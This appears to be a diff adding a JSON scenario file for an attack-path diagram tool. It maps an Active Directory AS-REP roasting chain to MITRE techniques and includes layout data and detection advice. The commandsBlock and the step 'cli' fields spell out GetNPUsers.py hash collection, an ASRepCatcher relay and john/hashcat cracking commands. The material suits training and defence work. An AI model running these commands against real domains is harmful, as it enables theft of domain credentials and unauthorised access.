@@ -1,0 +1,272 @@
+{
+  "title": "AS-REP Roasting with GetNPUsers to Offline Crack",
+  "description": "Collect roastable AS-REP material from preauth-disabled accounts and crack it offline with mode-aligned workflows.",
+  "version": "3.0",
+  "shortDescription": "AS-REP Roast to Crack",
+  "tags": [
+    "password-cracking",
+    "active-directory",
+    "as-rep-roast",
+    "kerberos",
+    "credential-access"
+  ],
+  "metadata": {
+    "descriptionHtml": "<p>This scenario extracts Kerberos AS-REP responses for accounts lacking pre-auth and routes artifacts into offline cracking with <span style='color:#ef4444;font-weight:bold;'>john</span> or <span style='color:#ef4444;font-weight:bold;'>hashcat -m 18200</span>. Direct extraction via <span style='font-weight:bold;'>GetNPUsers.py</span> and optional relay/listener capture both feed the same cracking pipeline.</p>",
+    "commandsBlock": "# Step 1: Pull roastable AS-REP responses\n$ python GetNPUsers.py <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast\n\n# Optional capture path\n$ ASRepCatcher relay -dc <DC_IP>\n\n# Step 3: Crack offline\n$ john --wordlist=passwords_kerb.txt hashes.asreproast\n$ hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt",
+    "prerequisites": [
+      "Target accounts configured with disabled Kerberos pre-authentication",
+      "Reachability to KDC (TCP/UDP 88)",
+      "Authorized assessment scope for credential auditing"
+    ],
+    "attackerGains": [
+      "Crackable AS-REP artifacts",
+      "Recovered plaintext domain credentials when cracking succeeds"
+    ],
+    "detectionNotes": [
+      "Eliminate accounts with pre-auth disabled unless strictly required",
+      "Monitor unusual AS-REQ/AS-REP request patterns per source host",
+      "Apply strong password controls and MFA to reduce impact"
+    ],
+    "mitreCategories": [
+      "T1558.004",
+      "T1187",
+      "T1110.002",
+      "T1078"
+    ],
+    "extraInfo": [
+      "Impacket GetNPUsers.py",
+      "ASRepCatcher relay/listen workflow",
+      "Hashcat mode 18200 reference"
+    ]
+  },
+  "entities": [
+    {
+      "id": "attacker_environment",
+      "label": "Collection and Cracking Environment",
+      "icon": "IconKali",
+      "type": "container",
+      "members": [
+        "operator_node",
+        "asrep_collector",
+        "asrep_hash_artifact",
+        "offline_crack_engine",
+        "recovered_credentials"
+      ],
+      "position": {
+        "x": -147.9049265127214,
+        "y": -7.85878475232721
+      }
+    },
+    {
+      "id": "kerberos_realm",
+      "label": "Kerberos Realm",
+      "icon": "IconActiveDirectory",
+      "type": "container",
+      "members": [
+        "domain_controller_kdc",
+        "target_user_set"
+      ],
+      "position": {
+        "x": 236.02536718329117,
+        "y": 24.52646004789784
+      }
+    },
+    {
+      "id": "operator_node",
+      "label": "Operator Host",
+      "icon": "IconKali",
+      "type": "node",
+      "position": {
+        "x": -283.59429988329555,
+        "y": 112.15190196896083
+      }
+    },
+    {
+      "id": "asrep_collector",
+      "label": "AS-REP Collector",
+      "icon": "IconPenetrationTool",
+      "type": "node",
+      "position": {
+        "x": -135.01088835753873,
+        "y": 129.29614176039428
+      }
+    },
+    {
+      "id": "asrep_hash_artifact",
+      "label": "AS-REP Hash Artifact",
+      "icon": "IconHash",
+      "type": "node",
+      "position": {
+        "x": -66.43392919180474,
+        "y": -126.4387684618219
+      }
+    },
+    {
+      "id": "offline_crack_engine",
+      "label": "Offline Crack Engine",
+      "icon": "IconTerminal",
+      "type": "node",
+      "position": {
+        "x": -272.87915001364956,
+        "y": -66.43392919180471
+      }
+    },
+    {
+      "id": "recovered_credentials",
+      "label": "Recovered Credentials",
+      "icon": "IconStolenCredential",
+      "type": "node",
+      "position": {
+        "x": -75.72039241216454,
+        "y": 2.8573732985723126
+      }
+    },
+    {
+      "id": "domain_controller_kdc",
+      "label": "Domain Controller / KDC",
+      "icon": "IconDC",
+      "type": "node",
+      "position": {
+        "x": 314.8955255631099,
+        "y": -93.38415462152027
+      }
+    },
+    {
+      "id": "target_user_set",
+      "label": "Preauth-Disabled Account Set",
+      "icon": "IconUser",
+      "type": "node",
+      "position": {
+        "x": 206.73095815170208,
+        "y": 50.43263871980018
+      }
+    }
+  ],
+  "visibility": {
+    "attacker_environment": {
+      "start": 0,
+      "end": 100
+    },
+    "kerberos_realm": {
+      "start": 0,
+      "end": 100
+    },
+    "operator_node": {
+      "start": 0,
+      "end": 100
+    },
+    "domain_controller_kdc": {
+      "start": 0,
+      "end": 100
+    },
+    "target_user_set": {
+      "start": 0,
+      "end": 100
+    },
+    "asrep_collector": {
+      "start": 2,
+      "end": 100
+    },
+    "asrep_hash_artifact": {
+      "start": 1,
+      "end": 100
+    },
+    "offline_crack_engine": {
+      "start": 0,
+      "end": 100
+    },
+    "recovered_credentials": {
+      "start": 4,
+      "end": 100
+    }
+  },
+  "steps": [
+    {
+      "id": 1,
+      "name": "Request Roastable AS-REP Data",
+      "mitre": {
+        "id": "T1558.004",
+        "tactic": "Credential Access",
+        "technique": "AS-REP Roasting"
+      },
+      "type": "edge",
+      "from": "domain_controller_kdc",
+      "to": "asrep_hash_artifact",
+      "icon": "IconTicket",
+      "description": "Request AS-REP responses for candidate accounts that do not require pre-authentication.",
+      "cli": "python GetNPUsers.py <DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast"
+    },
+    {
+      "id": 2,
+      "name": "Capture Additional Material via Relay/Listener",
+      "mitre": {
+        "id": "T1187",
+        "tactic": "Credential Access",
+        "technique": "Forced Authentication"
+      },
+      "type": "edge",
+      "from": "target_user_set",
+      "to": "asrep_collector",
+      "icon": "IconNetwork",
+      "description": "Optional capture path collects additional Kerberos credential material from forced/induced exchanges.",
+      "cli": "ASRepCatcher relay -dc <DC_IP>"
+    },
+    {
+      "id": 3,
+      "name": "Normalize Hash Inputs",
+      "mitre": {
+        "id": "T1110.002",
+        "tactic": "Credential Access",
+        "technique": "Password Cracking"
+      },
+      "type": "edge",
+      "from": "asrep_hash_artifact",
+      "to": "offline_crack_engine",
+      "icon": "IconData",
+      "description": "Prepare AS-REP artifact files and candidate dictionaries for deterministic cracking execution.",
+      "cli": "john --wordlist=passwords_kerb.txt hashes.asreproast"
+    },
+    {
+      "id": 4,
+      "name": "Run Hashcat Mode 18200",
+      "mitre": {
+        "id": "T1110.002",
+        "tactic": "Credential Access",
+        "technique": "Password Cracking"
+      },
+      "type": "edge",
+      "from": "offline_crack_engine",
+      "to": "recovered_credentials",
+      "icon": "IconExploit",
+      "description": "Execute offline cracking against AS-REP ciphertext and recover plaintext credentials when candidates match.",
+      "cli": "hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt"
+    },
+    {
+      "id": 5,
+      "name": "Return Valid Accounts to Operator",
+      "mitre": {
+        "id": "T1078",
+        "tactic": "Initial Access",
+        "technique": "Valid Accounts"
+      },
+      "type": "edge",
+      "from": "recovered_credentials",
+      "to": "operator_node",
+      "icon": "IconCheck",
+      "description": "Recovered credentials are delivered for authorized validation and downstream access testing."
+    }
+  ],
+  "attackMatrixOpen": false,
+  "sizeControlsOpen": false,
+  "viewport": {
+    "zoom": 1.3999999999999986,
+    "pan": {
+      "x": 552.8806490403063,
+      "y": 361.7550812536249
+    }
+  },
+  "stepInfoPosition": {
+    "x": 706.9996948242188,
+    "y": 847.5464477539062
+  }
+}
